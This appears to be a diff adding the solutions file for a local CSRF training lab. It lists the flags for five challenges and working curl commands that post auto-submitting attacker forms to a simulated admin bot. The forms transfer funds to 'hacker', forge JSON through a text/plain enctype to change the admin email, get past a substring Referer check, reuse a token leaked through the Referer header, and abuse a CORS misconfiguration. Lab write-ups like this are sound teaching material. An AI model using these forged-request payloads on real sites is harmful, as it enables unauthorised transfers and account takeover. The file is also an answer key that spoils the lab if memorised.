@@ -1,0 +1,82 @@
+===============================================================================
+  NeonBank — CSRF Lab Solutions (Port 5006)
+===============================================================================
+
+CHALLENGE 1: Basic CSRF — No Token Protection
+Flag: FLAG{csrf_b4s1c_f0rg3ry}
+
+  The /transfer endpoint has no CSRF token. Submit attacker HTML to the bot:
+
+  curl -X POST http://localhost:5006/bot \
+    -H "Content-Type: application/json" \
+    -d '{"html": "<form action=\"http://localhost:5006/transfer\" method=\"POST\"><input name=\"to_user\" value=\"hacker\"><input name=\"amount\" value=\"5000\"><input type=\"submit\"></form><script>document.forms[0].submit()</script>"}'
+
+  The bot (simulating admin) submits the form. When admin's balance drops
+  below 10000, the flag appears in the response.
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 2: JSON API CSRF — Content-Type Bypass
+Flag: FLAG{csrf_js0n_byp4ss}
+
+  The /api/settings endpoint accepts email changes without CSRF tokens.
+  It also accepts Content-Type: text/plain (bypasses preflight).
+
+  curl -X POST http://localhost:5006/bot2 \
+    -H "Content-Type: application/json" \
+    -d '{"html": "<form action=\"http://localhost:5006/api/settings\" method=\"POST\" enctype=\"text/plain\"><input name=\"{\\\"email\\\":\\\"hacked@evil.com\\\",\\\"x\" value=\"}\" type=\"hidden\"><input type=\"submit\"></form><script>document.forms[0].submit()</script>"}'
+
+  When admin's email changes from admin@neonbank.net, the flag is returned.
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 3: Referer Check Bypass — Substring Match
+Flag: FLAG{csrf_r3f3r3r_3v4d3}
+
+  The /transfer-protected endpoint checks if "localhost:5006" appears
+  anywhere in the Referer header (substring match, not exact origin).
+
+  curl -X POST http://localhost:5006/bot3 \
+    -H "Content-Type: application/json" \
+    -d '{"html": "<form action=\"http://localhost:5006/transfer-protected\" method=\"POST\"><input name=\"to_user\" value=\"hacker\"><input name=\"amount\" value=\"1000\"><input type=\"submit\"></form><script>document.forms[0].submit()</script>"}'
+
+  The bot's referer naturally contains "localhost:5006" since it uses
+  Flask's test client. In a real scenario, host the page on a domain
+  like http://evil.localhost:5006.attacker.com/exploit.html
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 4: CSRF Token Leak via Referer
+Flag: FLAG{csrf_t0k3n_l34k}
+
+  The /change-email endpoint uses a CSRF token, but puts it in the URL
+  query string. The /page-with-image page loads an external image, causing
+  the browser to send the full URL (including token) in the Referer header.
+
+  Step 1: Get the leaked token from the bot interaction:
+  curl -X POST http://localhost:5006/bot4 \
+    -H "Content-Type: application/json" \
+    -d '{"html": "<img src=\"http://localhost:5006/token-leak\">"}'
+
+  Step 2: The /token-leak endpoint captures and displays the leaked token.
+
+  Step 3: Use the token to change admin's email:
+  curl -X POST "http://localhost:5006/change-email?csrf_token=LEAKED_TOKEN" \
+    -d "email=pwned@evil.com"
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 5: CORS Misconfiguration
+Flag: FLAG{csrf_c0rs_m1sc0nf1g}
+
+  The /api/transfer endpoint sets Access-Control-Allow-Origin: * and
+  Access-Control-Allow-Credentials: true. It also lacks any CSRF token
+  requirement for text/plain content type.
+
+  curl -X POST http://localhost:5006/bot5 \
+    -H "Content-Type: application/json" \
+    -d '{"html": "<form action=\"http://localhost:5006/api/transfer\" method=\"POST\" enctype=\"text/plain\"><input name=\"{\\\"to_user\\\":\\\"hacker\\\",\\\"amount\\\":5000,\\\"x\" value=\"}\" type=\"hidden\"><input type=\"submit\"></form><script>document.forms[0].submit()</script>"}'
+
+  POST /reset to restore the database between attempts.
+
+===============================================================================
